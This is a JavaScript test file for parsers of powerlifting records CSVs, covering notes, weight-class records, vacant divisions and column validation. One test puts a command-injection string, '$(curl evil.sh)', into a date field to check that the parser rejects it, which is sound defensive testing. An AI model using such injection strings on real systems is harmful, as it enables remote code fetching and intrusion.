import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { parseDivision, parseNotes } from '../scripts/pap/parse.mjs';

const read = (name) => readFileSync(`tests/fixtures/pap/${name}`, 'utf8');

test('parseNotes', () => {
	const n = parseNotes(read('notes.csv'));
	assert.equal(n.lastUpdated, 'July 13, 2026');
	assert.equal(n.notes.length, 9);
	assert.match(n.notes[3], /^Sub-Junior lifters are allowed to break Junior records/);
});

test('parseNotes rejects a Last Updated value that is not a plain date', () =>
	assert.throws(
		() => parseNotes(read('notes.csv').replace('July 13, 2026', 'July 13, 2026 $(curl evil.sh)')),
		/Last Updated/,
	));

test('parseDivision: men open', () => {
	const d = parseDivision(read('m-open.csv'));
	assert.equal(d.squat.length, 8);
	assert.deepEqual(d.squat[0], {
		weightClass: '59',
		lifter: 'Aeron Paul Casamayor',
		team: 'Hellside',
		kg: '217.5',
		date: '2/20/2024',
		venue: '2024 Raw Nationals',
	});
	assert.ok(!('birthYear' in d.squat[0]));
	assert.ok(d.total.length > 0 && d.benchOnly.length > 0);
});

test('parseDivision: all vacant', () => {
	const d = parseDivision(read('w-m4.csv'));
	assert.equal(d.squat.length, 8);
	assert.ok(Object.values(d).flat().every((r) => r.lifter === null));
});

test('changed column throws', () =>
	assert.throws(() => parseDivision(read('m-open.csv').replace('BIRTH YR', 'AGE')), /columns/));

test('unknown section throws', () =>
	assert.throws(() => parseDivision(read('m-open.csv').replace('DEADLIFT,', 'DEADLIFTS,')), /section/));
